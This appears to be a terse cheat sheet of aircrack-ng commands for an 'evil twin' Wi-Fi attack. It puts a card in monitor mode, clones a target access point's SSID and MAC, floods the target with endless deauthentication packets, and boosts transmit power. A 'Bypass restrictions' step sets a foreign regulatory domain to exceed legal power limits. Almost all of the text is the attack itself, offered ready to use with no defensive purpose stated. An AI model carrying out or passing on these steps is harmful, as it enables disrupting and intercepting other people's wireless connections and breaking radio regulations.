Start airmon
iwconfig
airmon-ng start wlan0
Start airdump
airodump-ng mon0
Wait for ssid to show
Create new AP with same ssid and mac
airbase-ng -a <bssid> --essid <ssid> -c <channel> mon0
Deauth your target
aireplay-ng --deauth 0 -a <bssid>
Run your AP at max power
iwconfig wlan0 txpower 27
(27 is max 'legal' power)
Bypass restrictions:
set to use another domain/country:
  • iw reg set BO
  • iwconfig wlan0 txpower 30
Wait for connection
